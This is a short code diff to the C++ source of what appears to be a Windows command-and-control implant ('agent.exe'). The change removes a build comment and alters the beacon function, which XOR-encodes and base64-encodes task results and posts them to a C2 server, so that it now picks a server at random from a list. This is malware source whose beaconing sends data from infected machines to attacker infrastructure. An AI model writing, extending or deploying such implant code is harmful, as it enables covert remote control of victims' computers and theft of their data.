@@ -1,4 +1,3 @@
-// Compile with : x86_64-w64-mingw32-g++ -o agent.exe main_exe.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp pe-exec.cpp -lwininet -lpsapi -static-libstdc++ -static-libgcc -lws2_32
 #include <windows.h>
 #include <iostream>
 #include <thread>
@@ -10,6 +9,8 @@
 #include "crypt.h"
 #include "http_client.h"
 #include "task.h"
+#include <random>
+#include <ctime>
 
 std::string beakon(const std::string& data_res) {
     std::string agent_id = generate_agent_id();
@@ -27,7 +28,11 @@ std::string beakon(const std::string& data_res) {
     std::string result_json = ss.str();
     std::string encoded = xor_data(result_json, XOR_KEY);
     std::string b64_encoded = base64_encode(encoded);
-    std::string res = http_post(VOLCHOCK_SERVER, VOLCHOCK_PORT, RESULTS_PATH, USER_AGENT, HEADER, b64_encoded);
+    constexpr int VOLCHOCK_SERVERS_COUNT = sizeof(VOLCHOCK_SERVERS) / sizeof(VOLCHOCK_SERVERS[0]);
+    std::mt19937 rng((unsigned int)std::time(nullptr));
+    std::uniform_int_distribution<int> distrib(0, VOLCHOCK_SERVERS_COUNT - 1);
+    int random_index = distrib(rng);
+    std::string res = http_post(VOLCHOCK_SERVERS[random_index], VOLCHOCK_PORT, RESULTS_PATH, USER_AGENT, HEADER, b64_encoded);
     return res;
 }
 
